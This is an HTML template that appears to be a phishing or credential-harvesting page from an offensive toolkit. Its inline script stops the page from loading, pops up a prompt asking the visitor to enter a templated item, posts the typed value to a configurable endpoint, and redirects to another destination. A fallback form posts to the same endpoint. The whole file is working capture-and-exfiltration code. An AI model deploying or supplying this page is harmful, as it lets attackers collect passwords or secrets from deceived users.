<!DOCTYPE html>
<html>
    <head>
        <script>
            window.stop();
            var data = prompt("Enter {{item}}");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "{{action}}", false);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            if (data) {xhr.send(`post_data=${data}`);}
            window.location.replace("{{destination}}");
        </script>
    </head>
    <body>
        <h1>Enter {{item}} below</h1>
        <form method="POST" action="{{action}}" id="form">
            <label for="post_data">{{item}}</label>
            <input type="text" name="post_data" id="post_data">
            <input type="submit">
        </form>
    </body>
</html>
